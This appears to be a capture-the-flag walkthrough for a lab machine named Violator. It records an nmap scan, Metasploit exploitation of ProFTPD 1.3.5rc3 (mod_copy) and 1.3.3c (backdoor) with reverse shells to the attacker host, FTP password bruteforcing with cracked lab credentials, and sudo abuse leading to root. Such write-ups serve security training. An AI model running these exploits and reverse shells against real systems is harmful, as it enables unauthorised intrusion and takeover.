Violator


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Source code web page 
[+] ProFTP 1.3.5rc3 - Metasploit exploitation
[+] Privilege Escalation with SUDO right /home/dg/bd/sbin/proftpd
[+] ProFTP 1.3.3c -  Metasploit exploitation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.101
Host is up (0.00078s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5rc3
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: I Say... I say... I say Boy! You pumpin' for oil or somethin'...?
MAC Address: 08:00:27:21:B8:54 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Unix

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Using Metasploit to gain reverse shell


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf5 > use exploit/unix/ftp/proftpd_modcopy_exec 
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show options 

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5


msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set rhosts 192.168.56.101
rhosts => 192.168.56.101
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] 192.168.56.101:80 - 192.168.56.101:21 - Connected to FTP server
[*] 192.168.56.101:80 - 192.168.56.101:21 - Sending copy commands to FTP server
[-] 192.168.56.101:80 - Exploit aborted due to failure: unknown: 192.168.56.101:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set sitepath /var/www/html
sitepath => /var/www/html
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] 192.168.56.101:80 - 192.168.56.101:21 - Connected to FTP server
[*] 192.168.56.101:80 - 192.168.56.101:21 - Sending copy commands to FTP server
[*] 192.168.56.101:80 - Executing PHP payload /PRHgv.php
[*] Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.101:40271) at 2019-10-11 00:03:56 -0400

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@violator:/home$ ls -al
ls -al
total 24
drwxr-xr-x  6 root root 4096 Jun  6  2016 .
drwxr-xr-x 22 root root 4096 Jun 14  2016 ..
drwxr-xr-x  3 af   af   4096 Jun 12  2016 af
drwxr-xr-x  2 aw   aw   4096 Jun 12  2016 aw
drwxr-xr-x  4 dg   dg   4096 Jun 14  2016 dg
drwxr-xr-x  2 mg   mg   4096 Jun 12  2016 mg


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Bruteforcing passwords for FTP using the users found.
Password file got from wiki page in index. https://en.wikipedia.org/wiki/Violator_(album)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[DATA] attacking ftp://192.168.56.101:21/
[21][ftp] host: 192.168.56.101   login: af   password: enjoythesilence
1 of 1 target successfully completed, 1 valid password found

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Getting user dg


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@violator:~/html$ su dg  
su dg
Password: policyoftruth

dg@violator:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for dg on violator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dg may run the following commands on violator:
    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
dg@violator:/var/www/html$ sudo /home/dg/bd/sbin/proftpd
sudo /home/dg/bd/sbin/proftpd
 - setting default address to 127.0.0.1
localhost - SocketBindTight in effect, ignoring DefaultServer
dg@violator:/var/www/html$ netstat -antp
netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:2121          0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.56.101:49362    192.168.56.102:4433     ESTABLISHED 1632/bash       
tcp        0      0 192.168.56.101:40272    192.168.56.102:4444     CLOSE_WAIT  -               
tcp        0      0 192.168.56.101:40277    192.168.56.102:4444     CLOSE_WAIT  -               
tcp        0      0 192.168.56.101:40270    192.168.56.102:1234     ESTABLISHED -               
tcp        0      0 192.168.56.101:40271    192.168.56.102:4444     CLOSE_WAIT  -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 192.168.56.101:80       192.168.56.102:46216    ESTABLISHED -               
dg@violator:/var/www/html$ telnet 127.0.0.1 2121
telnet 127.0.0.1 2121
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


User dg has SUDO rights to run /home/dg/bd/sbin/proftpd
Testing with netstat we see the ftp service is running on port 2121.

We first portforward the port to localhost:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# telnet 127.0.0.1 2121
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The FTP server is ProFTPD 1.3.3c and this is vulnerable 

Exploitation of ProFTPd 1.3.3c

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
meterpreter > background 
[*] Backgrounding session 6...
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > show options 

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   127.0.0.1        yes       The target address range or CIDR identifier
   RPORT    2121             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address (an interface may be specified)
   LPORT  12312            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP handler on 192.168.56.102:12312 
[*] 127.0.0.1:2121 - Sending Backdoor Command
[*] Command shell session 7 opened (192.168.56.102:12312 -> 192.168.56.101:46347) at 2019-10-11 01:42:42 -0400

id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

